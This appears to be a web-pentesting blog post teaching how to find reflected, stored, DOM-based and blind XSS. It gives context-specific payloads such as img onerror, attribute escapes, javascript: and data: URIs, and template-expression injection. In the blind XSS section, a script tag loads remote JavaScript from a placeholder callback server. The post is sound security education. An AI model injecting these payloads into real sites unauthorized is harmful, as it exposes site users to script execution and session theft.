Since I have written blogs on learning web pentesting, this time I am going to write a series covering every major web vulnerability, starting with XSS.

<div style={styles.lead}>
      <strong>Core idea:</strong> As you may have read in reconnaissance, the
      first step is always contextual mapping even before we move toward payload
      writing.
</div>

There are many subcategories of XSS, i.e. Reflected, Stored, DOM-based, and Blind.

## Reflected XSS

<div style={styles.lead}>
      <strong>First Step:</strong> The very first step is to find any field
      where you can input any value and then to check where it is being
      reflected in the response, whether it is modified or unmodified.
</div>

For Reflected XSS, you will generally find the input in HTML body, HTML attribute, script tag and URL.

### If it is in HTML body

We test with tag injection:

```html
<img src=test onerror=alert>
```

### If it is in HTML attribute

We escape using quotes `"`:

```html
"onmouseover=alert(1)"
```

### If it is in script tag or a JavaScript string literal

We use string literal closure:

```javascript
';alert(1);//
```

### If it is in URL

We use `javascript:` or `data:` protocol injection:

```javascript
javascript:alert(1)
```

Other examples / variants:

```text
data:[MIME type][;charset][;base64],<data>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg== (base64 encoded)
data:text/html,<script>alert(1)</script>
```

### If it is in the Template expression (Angular/Vue)

We use template expression syntax:

```javascript
{{constructor.constructor('alert(1)')()}}
```

## Additional Checks & Variations

* We also check for Content Security Policy (unsafe-inline, unsafe-eval or overly permissive domains).

* Also test your payload via URL encoding, HTML encoding and double encoding variants as well.

<div style={styles.flow}>
      <strong>Mistakes You might make:</strong>
      <div style={{ marginTop: '0.4rem' }}>
            Copy-pasting a generic payload <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> everywhere. It only works for raw HTML body context, fails in most other contexts, and you may not understand why.
      </div>
</div>

## Stored XSS

<div style={styles.lead}>
      <strong>First Step:</strong> Find where user input is submitted (for
      example comments, profile filename, bio, or username) and then identify
      where that same data is displayed after submission.
</div>

Create a unique marker first, then check every place where that data may appear:
admin views, email notifications, API responses, search snippets, and RSS feeds.

Once you find the rendering location, repeat the same context-mapping process as
Reflected XSS. Also verify whether it renders only for you or for other users,
because multi-user impact is generally more severe.

<div style={styles.flow}>
      <strong>Mistakes You might make:</strong>
      <div style={{ marginTop: '0.4rem' }}>
            Only checking the page where you submitted the input. Stored payloads
            often execute in other pages and workflows.
      </div>
</div>

---

## DOM-based XSS

<div style={styles.lead}>
      <strong>First Step:</strong> Search JavaScript source files for dangerous
      sinks and then trace the data flow backward.
</div>

Common sinks include:

```text
innerHTML, outerHTML, document.write, eval, setTimeout, setInterval,
insertAdjacentHTML, script.src, iframe.src, and jQuery html()/append()
```

For each sink, trace backward to identify which variable feeds it.

Then trace that variable to user-controlled sources such as:

```text
location.hash, location.search, document.referrer, postMessage data,
window.name, localStorage, sessionStorage
```

After finding the sink-source path, build payloads that match how that specific
sink interprets input.

Test in the browser directly (address bar and DevTools), because DOM XSS often
does not reach the server.

<div style={styles.flow}>
      <strong>Mistakes You might make:</strong>
      <div style={{ marginTop: '0.4rem' }}>
            Treating DOM XSS exactly like Reflected XSS and testing only through
            HTTP requests. Many DOM sinks never hit the server, so proxy-only
            testing can miss the issue.
      </div>
</div>

## Blind XSS

<div style={styles.lead}>
      <strong>First Step:</strong> Use a callback endpoint because execution may
      happen later in another application (often an admin panel).
</div>

Set up a callback server (for example Burp Collaborator or Interactsh), then
submit payloads in fields with no immediate output, such as contact forms,
support tickets, password reset notes, or internal log viewers.

Example callback payload:

```html
<script src="https://your-server.com/xss.js"></script>
```

Blind XSS requires patience. Triggers can happen minutes, hours, or even days
later when another user (often admin/support) views the stored data.
